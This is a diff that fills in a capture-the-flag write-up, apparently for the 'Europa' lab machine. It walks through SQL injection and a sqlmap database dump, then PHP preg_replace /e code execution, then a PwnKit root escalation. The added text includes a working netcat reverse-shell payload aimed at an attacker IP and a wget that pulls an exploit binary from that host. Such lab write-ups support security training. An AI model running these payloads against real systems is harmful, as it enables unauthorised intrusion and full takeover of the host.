@@ -5,8 +5,8 @@
 - OS: Linux
 
 ## Summary
-- Initial access:
-- Privilege escalation:
+- Initial access: RCE via PHP Function
+- Privilege escalation: Polkit LPE
 
 ## Enumeration
 #### Steps
@@ -40,11 +40,11 @@ PORT    STATE SERVICE  VERSION
 ## Foothold
 
 #### Steps
-
+- Visit target on port 80, presents with a login form
 ![[Pasted image 20260528120750.png]]
-
-
+- Test for SQLi, if we place a payload like `' OR '1' = '1' -- -` we get a SQL error message
 ![[Pasted image 20260528120915.png]]
+- Attempt SQLi with SQLmap 
 ```
 $ sqlmap -u "https://admin-portal.europacorp.htb/login.php" --data="email=test%40test.com&password=123" --level 5 --risk 3 --batch -D admin --tables -T users --dump
         ___
@@ -140,37 +140,25 @@ Table: users
 
 [*] ending @ 21:38:11 /2026-05-27/
 ```
-
+- Enumerate the database with SQLmap we two users and their hashed password
+- [hashes.org](https://hashes.org/) shows the plaintext to be  `SuperSecretPassword!`
+- Login with  `admin : SuperSecretPassword!`
+- On the `tools.php` there is a vulnerability with regarding to how the IP is replace when entered into `IP Address of Remote Host`
+- The replace function used is `preg_replace` and  the dangerous part is the [modifiers](https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php), specifically `/e` or `PREG_REPLACE_EVAL`, which allows for the replacement to be evaled (executed) by PHP before it is replaced.
+- E.g. input like 
 ```
-admin@europacorp.htb ';-- -
+$a = "[x '.system('id').']";
 ```
-
+- Will be evaluated as `system('id')`
+		1. Pattern matches `[x ${system('id')}]`.
+		2. `\\2` becomes the string `${system('id')}`.
+		3. The replacement string becomes: `"y(\"${system('id')}\")"`
+		4.**Because of `/e`**, this string is evaluated as PHP code **before** being used as the replacement.
+- We can craft a RCE payload 
 ```
-POST /tools.php HTTP/1.1
-Host: admin-portal.europacorp.htb
-Cookie: PHPSESSID=0sql38fvcutrftv5nk5pttk375
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Referer: https://admin-portal.europacorp.htb/tools.php
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 1690
-Origin: https://admin-portal.europacorp.htb
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: same-origin
-Sec-Fetch-User: ?1
-Priority: u=0, i
-Te: trailers
-Connection: keep-alive
-
-
-
-pattern=%2Fip_address%2F&ipaddress=system("id")&text=%22openvpn%22%3A+%7B%0D%0A++++++++%22vtun0%22%3A+%7B%0D%0A++++++++++++++++%22local-address%22%3A+%7B%0D%0A++++++++++++++++++++++++%2210.10.10.1%22%3A+%22%27%27%22%0D%0A++++++++++++++++%7D%2C%0D%0A++++++++++++++++%22local-port%22%3A+%221337%22%2C%0D%0A++++++++++++++++%22mode%22%3A+%22site-to-site%22%2C%0D%0A++++++++++++++++%22openvpn-option%22%3A+%5B%0D%0A++++++++++++++++++++++++%22--comp-lzo%22%2C%0D%0A++++++++++++++++++++++++%22--float%22%2C%0D%0A++++++++++++++++++++++++%22--ping+10%22%2C%0D%0A++++++++++++++++++++++++%22--ping-restart+20%22%2C%0D%0A++++++++++++++++++++++++%22--ping-timer-rem%22%2C%0D%0A++++++++++++++++++++++++%22--persist-tun%22%2C%0D%0A++++++++++++++++++++++++%22--persist-key%22%2C%0D%0A++++++++++++++++++++++++%22--user+nobody%22%2C%0D%0A++++++++++++++++++++++++%22--group+nogroup%22%0D%0A++++++++++++++++%5D%2C%0D%0A++++++++++++++++%22remote-address%22%3A+%22ip_address%22%2C%0D%0A++++++++++++++++%22remote-port%22%3A+%221337%22%2C%0D%0A++++++++++++++++%22shared-secret-key-file%22%3A+%22%2Fconfig%2Fauth%2Fsecret%22%0D%0A++++++++%7D%2C%0D%0A++++++++%22protocols%22%3A+%7B%0D%0A++++++++++++++++%22static%22%3A+%7B%0D%0A++++++++++++++++++++++++%22interface-route%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++%22ip_address%2F24%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++++++++++%22next-hop-interface%22%3A+%7B%0D%0A++++++++++++++++++++++++++++++++++++++++++++++++%22vtun0%22%3A+%22%27%27%22%0D%0A++++++++++++++++++++++++++++++++++++++++%7D%0D%0A++++++++++++++++++++++++++++++++%7D%0D%0A+++++++++++++
+pattern=/x/e&ipaddress=system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.109 4444 >/tmp/f")&text=x
 ```
-
+- Capture a request and modify the pattern
 ```
 POST /tools.php HTTP/1.1
 Host: admin-portal.europacorp.htb
@@ -201,7 +189,9 @@ pattern=%2Fx%2Fe&ipaddress=system("rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%2
 ## Privilege Escalation
 
 #### Steps
-
+- Load and run `linpeas.sh`
+- Identified that the target might be vulnerable to `PolKit` LPE 
+- Load `PwnKit` to target and run https://github.com/ly4k/PwnKit
 ```
 www-data@europa:/tmp$ wget http://10.10.14.109:8000/PwnKit
 wget http://10.10.14.109:8000/PwnKit
@@ -218,7 +208,7 @@ PwnKit              100%[===================>]  17.62K  74.0KB/s    in 0.2s
 www-data@europa:/tmp$ chmod +x ./PwnKit
 chmod +x ./PwnKit
 ```
-
+- We get a shell back as root
 ```
 www-data@europa:/tmp$ ./PwnKit
 ./PwnKit
